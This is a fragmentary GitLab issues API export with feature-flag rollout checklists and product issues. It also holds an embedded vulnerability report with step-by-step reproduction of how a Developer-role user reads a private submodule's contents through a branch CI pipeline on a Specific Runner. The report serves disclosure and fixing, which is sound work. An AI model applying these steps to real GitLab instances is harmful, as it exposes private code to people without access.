Tang","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/750946/avatar.png","web_url":"https://gitlab.com/dennis"},"labels":["Category:Audit Events","Next Up","backend","devops::manage","feature flag","group::compliance","incident","priority::2","reproduced on GitLab.com","section::dev","severity::1","type::bug","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":10467142,"username":"harsimarsandhu","name":"Harsimar Sandhu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10467142/avatar.png","web_url":"https://gitlab.com/harsimarsandhu"}],"author":{"id":5833976,"username":"mwoolf","name":"Max Woolf","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c8af02fcb6678db41bd8d3a29f9c1d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/mwoolf"},"type":"ISSUE","assignee":{"id":10467142,"username":"harsimarsandhu","name":"Harsimar Sandhu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10467142/avatar.png","web_url":"https://gitlab.com/harsimarsandhu"},"user_notes_count":17,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359066","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359066","notes":"https://gitlab.com/api/v4/projects/278964/issues/359066/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359066/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359066","relative":"#359066","full":"gitlab-org/gitlab#359066"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106628352,"iid":359060,"project_id":278964,"title":"Split VSA metrics into 2 rows","description":"### Problem\n\nWe need to add additional metrics to the VSA page under the overview stage but are running out of horizontal space.

Here is my take on the issue, which I was able to validate\n\n## Summary\n\nA developer can access the contents of a private submoduled repository when a Specific Runner is used (as opposed to Shared Runners). This has been validated on .com.\n\n## Steps to Reproduce\n\nWe will have User A, the victim Maintainer, and User B, the malicious Developer.\n\n### Set up the Group \u0026 Projects\n\nAll of the following actions are as User A. In example snippets, User A is named `nmalcolm`.\n\n1. Create a group called `submodule-test-group`\n1. Within that group, create a private project named `submodule-parent`\n1. Invite User B as a Developer role to the project\n1. Within the group create a private project named `submodule-child`. Create a file in the `main` branch called `secret.txt` with dummy text.\n1. Check out `submodule-parent` locally.\n1. Run `git submodule add git@gitlab.com:nmalcolm/submodule-child.git`. \n1. Modify `.gitmodules` as follows:\n\n```\n[submodule \"submodule-child\"]\n\tpath = submodule-child\n\turl = ../../submodule-test-group/submodule-child.git\n```\n\n1. Add a file `.gitlab-ci.yml` with the following contents:\n\n```\nvariables:\n  GIT_SUBMODULE_STRATEGY: recursive\nstages:\n    - build\n\nbuild:\n    stage: build\n    script:\n        - echo \"This is a benign CI job\"\n```\n\n1. Commit and push that to `submodule-parent`'s main branch.\n1. In the GitLab UI go to `https://gitlab.com/nmalcolm/submodule-parent/-/jobs/` and observe the latest job. The job should be successful.\n\n### Set up a Specific Runner\n\n1. As User A, go to the `submodule-parent` project, and get a Runner Registration token from `Settings \u003e CI/CD \u003e Runners`.\n1. In a Cloud Provider (e.g. [Sandbox Cloud](https://about.gitlab.com/handbook/infrastructure-standards/realms/sandbox/)) create a Runner.\n   1. I used AWS, with an Ubuntu image.\n   2. I followed these instructions to install Docker: https://docs.docker.com/engine/install/ubuntu/\n   3. I followed these instructions to install GitLab Runner: https://docs.gitlab.com/runner/install/docker.html#option-1-use-local-system-volume-mounts-to-start-the-runner-container\n   4. I followed these instructions to register the GitLab Runner, using the registration token from the earlier step: https://docs.gitlab.com/runner/register/#one-line-registration-command\n\n```\nroot@ip-172-31-28-151:/home/ubuntu# docker run --rm -v /srv/gitlab-runner/config:/etc/gitlab-runner gitlab/gitlab-runner register \\\n\u003e   --non-interactive \\\n\u003e   --executor \"docker\" \\\n\u003e   --docker-image alpine:latest \\\n\u003e   --url \"https://gitlab.com/\" \\\n\u003e   --registration-token \"GR13REDACTED\" \\\n\u003e   --description \"docker-runner\" \\\n\u003e   --tag-list \"test\" \\\n\u003e   --run-untagged=\"true\" \\\n\u003e   --locked=\"false\" \\\n\u003e   --access-level=\"not_protected\"\nRuntime platform                                    arch=amd64 os=linux pid=7 revision=bd40e3da version=14.9.1\nRunning in system-mode.\n\nRegistering runner... succeeded                     runner=GR13REDACTED\nRunner registered successfully.

Observe the registered Specific Runner.\n1. Disable Shared Runners, so that all jobs will be run by the Specific Runner.\n1. Go and re-run the job we ran earlier. It will now use the Specific runner, and the message should still look like:\n\n```\nRunning with gitlab-runner 14.9.1 (bd40e3da)\n  on docker-runner i74p_kZM\nPreparing the \"docker\" executor\n00:05\nUsing Docker executor with image alpine:latest ...\nPulling docker image alpine:latest ...\nUsing docker image sha256:0ac33e5f5afa79e084075e8698a22d574816eea8d7b7d480586835657c3e1c8b for alpine:latest with digest alpine@sha256:4edbd2beb5f78b1014028f4fbb99f3237d9561100b6881aabbf5acce2c4f9454 ...\nPreparing environment\n00:01\nRunning on runner-i74pkzm-project-34588976-concurrent-0 via e3948fe46887...\nGetting source from Git repository\n00:02\nFetching changes with git depth set to 20...\nInitialized empty Git repository in /builds/submodule-test-group/submodule-parent/.git/\nCreated fresh repository.\nChecking out 857541f8 as main...\nUpdating/initializing submodules recursively with git depth set to 20...\nSubmodule 'submodule-child' (https://gitlab-ci-token:[MASKED]@gitlab.com/submodule-test-group/submodule-child.git) registered for path 'submodule-child'\nCloning into '/builds/submodule-test-group/submodule-parent/submodule-child'...\nSubmodule path 'submodule-child': checked out 'b3bdad20185059f520c277a4b8504cd4b64dd4a5'\nEntering 'submodule-child'\nEntering 'submodule-child'\nExecuting \"step_script\" stage of the job script\n00:01\nUsing docker image sha256:0ac33e5f5afa79e084075e8698a22d574816eea8d7b7d480586835657c3e1c8b for alpine:latest with digest alpine@sha256:4edbd2beb5f78b1014028f4fbb99f3237d9561100b6881aabbf5acce2c4f9454 ...\n$ echo \"This is a benign CI job\"\nThis is a benign CI job\nCleaning up project directory and file based variables\n00:01\nJob succeeded\n```\n\nWe can see that `submodule-child` was successfully cloned, and a benign message was echoed out.

User U1 and U2 are administrator and developer (in terms of roles) respectively. U1 and U2 are both members of P1 but in P2, only user U1 is present with the administrator role. Now P1 is having a submodule link to P2. Obviously, all the local branches for U1 will have access to P2 files but U2's local branches will not have the files in the P2 submodule. The trick is to enable CI/CD in P1. In Git CI/CD yml file, we need to add a recursive command variable for P2 branch checkout to access files in it. Obviously, the P1's main branch is off-limits to U2, so he cannot edit/execute the pipelines. But we have created a branch for those U2 users in P1. Now the same Git CI/CD yml file the U2 user can push to his branch and can run the pipeline. This is leading to the displaying of all the project P2 contents for U2 who in the first place doesn't have access to.\n\n#####  Steps to reproduce\n\n(Step-by-step guide to reproduce the issue, including:)\n\n1. Create two projects and two users P1 and P2, U1 and U2.  \n2. Add U1 and U2 in P1 with U1 being administrator/maintainer and U2 being a developer.  \n3. Create one branch in P1 apart from the main branch and the U2 can use that branch. And make the main branch protected and do not allow \"Developer\" to push/merge.  \n4. Now add U1 as an administrator in the P2 project which only has one branch (main branch).  \n5. Create a submodule with the latest changeset of P2 inside the P1 root folder.  \n6. Here the user with his own P1 branch can not view any files of the created submodule  \n6. Create a pipeline with default git CI-CD yml file containing a set of instructions to list out all the files in the root folder of the P2 project's main branch.  \n7. The user U2 cannot have permission to start the pipeline if it's manually triggered. Also, he cannot edit the yml file in the main branch.  \n8. But the user U2 will have access to view the .gitmodules file which is in the P1 project root folder. There he can see the path of the root folder of project P2.  \n9. Now he can add his own statements in his own branch's git CI CD pipeline editor and can run the same pipeline.  \n10. While the pipeline runs, the folder contents are being listed to user U2 which is actually direct improper access control.\n\n\nGitLab version - GitLab Enterprise Edition 14.9.0-pre\n\n####  Impact\n\nThe users who do not have access to P2 project files can view the folder structure, file content, etc via CI/CD pipelines.\n\n## How To Reproduce\n\nPlease add [reproducibility information]

flag] Roll out `environment_multiple_stop_actions`","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout [multiple stop actions](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/84922) for the Environments page on production,\nthat is currently behind the `environment_multiple_stop_actions` feature flag.\n\nRelated issue : https://gitlab.com/gitlab-org/gitlab/-/issues/22456\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n\n## Owners\n\n- Team: `group::release`\n- Most appropriate slack channel to reach out to: `#s_release`\n- Best individual to reach out to: @bala.kumar \n- PM:@cbalane\n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## Expectations\n\n### What are we expecting to happen?\n\nWhen there are multiple stop actions for an environments, those stop actions are run in parallel as described in https://docs.gitlab.com/ee/ci/environments/#multiple-stop-actions-for-an-environment\n\n### When is the feature viable?\n\nWhen an environment is stopped, this feature is applicable.\n\n\u003c!-- \nExample below:\n \n1. Enable service ping collection\n   `ApplicationSetting.first.update(usage_ping_enabled: true)`\n--\u003e\n\n### What might happen if this goes wrong?\nEnvironment `on_stop` action can give 5xx.\n\n\n### What can we monitor to detect problems with this?\n  - https://log.gprd.gitlab.net/goto/3bd6bfb0-cbc8-11ec-afaf-2bca15dfbf33\n\n### What can we check for monitoring production after rollouts?\n\n\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status 62d832bbbe573e278316c7a0e52da2865118987e`\n- [x] Enable the feature globally on non-production environments.\n    - [x] `/chatops run feature set environment_multiple_stop_actions true --dev`\n    - [x] `/chatops run feature set environment_multiple_stop_actions true --staging`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status 651aeff6bcc301be32f7cb1eb532cbab7189e3b1`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab environment_multiple_stop_actions true`\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab-foss environment_multiple_stop_actions true`\n    - [ ] `/chatops run feature set --project=gitlab-com/www-gitlab-com environment_multiple_stop_actions true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org environment_multiple_stop_actions true`\n    - [ ] `/chatops run feature set --group=gitlab-com environment_multiple_stop_actions true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e environment_multiple_stop_actions true`\n- [ ] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set environment_multiple_stop_actions \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set environment_multiple_stop_actions \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set environment_multiple_stop_actions true`\n- [x] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `environment_multiple_stop_actions`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `environment_multiple_stop_actions` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [x] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [x] `/chatops run feature delete environment_multiple_stop_actions --dev`\n    - [x] `/chatops run feature delete environment_multiple_stop_actions --staging`\n    - [x] `/chatops run feature delete environment_multiple_stop_actions`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set environment_multiple_stop_actions false\n```","state":"closed","created_at":"2022-04-13T07:54:20.911Z","updated_at":"2022-05-16T18:18:15.942Z","closed_at":"2022-05-16T18:18:15.879Z","closed_by":{"id":9253328,"username":"bala.kumar","name":"Bala

Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [x] `/chatops run feature set --project=gitlab-org/gitlab ci_expand_environment_name_and_url true`\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab-foss ci_expand_environment_name_and_url true`\n    - [x] `/chatops run feature set --project=gitlab-com/www-gitlab-com ci_expand_environment_name_and_url true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org ci_expand_environment_name_and_url true`\n    - [ ] `/chatops run feature set --group=gitlab-com ci_expand_environment_name_and_url true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e ci_expand_environment_name_and_url true`\n- [ ] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com. \n- [ ] Ensure that any breaking changes have been announced following the [release post process](https://about.gitlab.com/handbook/marketing/blog/release-posts/#deprecations-removals-and-breaking-changes) to ensure GitLab customers are aware.\n- [ ] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [x] `/chatops run feature set ci_expand_environment_name_and_url \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set ci_expand_environment_name_and_url \u003crollout-percentage\u003e --random`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set ci_expand_environment_name_and_url true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can [create a separate issue](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `ci_expand_environment_name_and_url`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\nYou can either [create a follow-up issue for Feature Flag Cleanup](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) or use the checklist below in this same issue.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `ci_expand_environment_name_and_url` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete ci_expand_environment_name_and_url --dev`\n    - [ ] `/chatops run feature delete ci_expand_environment_name_and_url --staging`\n    - [ ] `/chatops run feature delete ci_expand_environment_name_and_url`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set ci_expand_environment_name_and_url false\n```","state":"closed","created_at":"2022-04-12T16:00:06.193Z","updated_at":"2022-08-15T13:42:45.405Z","closed_at":"2022-07-26T08:23:05.471Z","closed_by":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"labels":["Category:Pipeline Authoring","backend","devops::verify","feature flag","group::pipeline authoring","section::ops","type::maintenance","workflow::production"],"milestone":{"id":2453025,"iid":75,"group_id":9970,"title":"15.3","description":"","state":"active","created_at":"2022-02-03T22:28:50.229Z","updated_at":"2022-02-03T22:28:50.229Z","due_date":"2022-08-17","start_date":"2022-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/75"},"assignees":[{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"}],"author":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"type":"ISSUE","assignee":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358831","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":50,"completed_count":7},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"7 of 50 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358831","notes":"https://gitlab.com/api/v4/projects/278964/issues/358831/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358831/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358831","relative":"#358831","full":"gitlab-org/gitlab#358831"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":{"id":61387,"iid":75,"sequence":22,"group_id":9970,"title":null,"description":null,"state":3,"created_at":"2022-05-29T00:05:02.030Z","updated_at":"2022-08-22T00:05:02.161Z","start_date":"2022-08-08","due_date":"2022-08-21","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/61387"},"health_status":"on_track"},{"id":106534736,"iid":358823,"project_id":278964,"title":"Improve accessibility of Admin app settings page - add help text","description":"In https://gitlab.com/gitlab-org/gitlab/-/merge_requests/84651 we removed the placeholder property from the textarea in `app/views/admin/application_settings/_users_api_limits.html.haml` and similar, to improve the accessibility of the Admin application settings page.\n\nHowever, as @danmh [commmented](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/84651#note_906102891):\n\u003e Although problematic, the placeholder did offer some clues of the expected input format.

for Zuora was introduced with gitlab-org/gitlab!84342. The idea is to harmonise all the usages (i.e. replace all implementations with this new component).\n\nIn order to make the transition easier, we should first address how the component API will act on error cases (e.g. which events to emit, under which conditions, etc). This is especially important because most implementations are using an external button that needs to be disabled when certain (error) states occur. Additionally, some of the requests will need to go up and therefore rely on event communication.\n\nWhile here, we can cover also some non-error states.\n\n### Implementation (proposal)\n\nThese events should be emitted when the described state obtains.\n\n##### Error states\n\n| Zuora Simple error state | Event to emit\n|-|-|\n| iFrame did not load/render | `loaded-error` |\n| Validation error: client | `client-validation-error` |\n| Validation error: server | `server-validation-error` |\n| Payment submit error | `payment-submit-error` |\n\n##### Success states\n\n| Zuora Simple state | Event to emit |\n|-|-|\n| iFrame did load/render | `loaded` |\n| Payment submit success | `success` |\n\nAdditional:\n\n1. an `enum`-like structure (already [here](https://gitlab.com/gitlab-org/gitlab/-/blob/1e54acf4e5349639f5ca65cf172ff88b1bc49d8c/ee/app/assets/javascripts/billings/components/zuora_simple.vue#L29)) for the values of the event can be created. It makes dispatching/listening more consistent\n1. make sure to test the events are correctly emitted\n\n#### How to get ZuoraSimple\n\nThis requires _both_ `gdk` and CustomersDot running.\n\n* Setup the HPM in Zuora Api Sandbox, you have two ways:\n  1. create an HPM similar to this: https://apisandbox.zuora.com/apps/HostedPageLite.do?method=preview\u0026id=8ad099157fd495bf017fdadbab7e6959:\n      - set the as name `GL.com Credit Card Validation_\u003cyour-name\u003e` (e.g. `GL.com Credit Card Validation_agulina`)\n      - for URL/host, use your `gdk` host\n  1. just use mine :innocent: (but please, **do not** change the configurations, it assumes you run `gdk` on `http://localhost:3000`)\n* copy the `id` of the page (mine is `8ad099157fd495bf017fdadbab7e6959`)\n* go to `secrets.yml` in CustomersDot and use it for `zuora_payment_method_validation_page_id` in `development` settings (if not there, add it manually)\n* (restart CustomersDot)\n* in your terminal, export `GITLAB_SIMULATE_SAAS=true` (if `gdk` is already running, do a `gdk restart`)\n* go to the `gdk` rails console and type `Feature.enable(:ci_require_credit_card_on_free_plan)`\n\nNext, steps to see the feature:\n\n* Create a new User on your `gdk`. You can add it by visiting `/admin/users/` and logging in with your `root`. The user **should not** be ad admin\n* Log in with the new user\n* Create a group and a project\n* In the repository of the project, create a `.gitlab-ci.yml` file (you can select whatever template)\n* Visit `/-/pipelines/new` under your project\n* Click on `Run pipeline`\n* An alert should appear, click on `Validate account`\n* To use the form under `ZuoraSimple`, go to the `gdk` rails console and type `Feature.enable(:use_api_for_payment_validation)`\n* (refresh the page)","state":"closed","created_at":"2022-04-12T09:46:40.939Z","updated_at":"2022-11-22T02:42:08.554Z","closed_at":"2022-05-10T05:49:02.834Z","closed_by":{"id":10590518,"username":"snachnolkar","name":"Sharmad

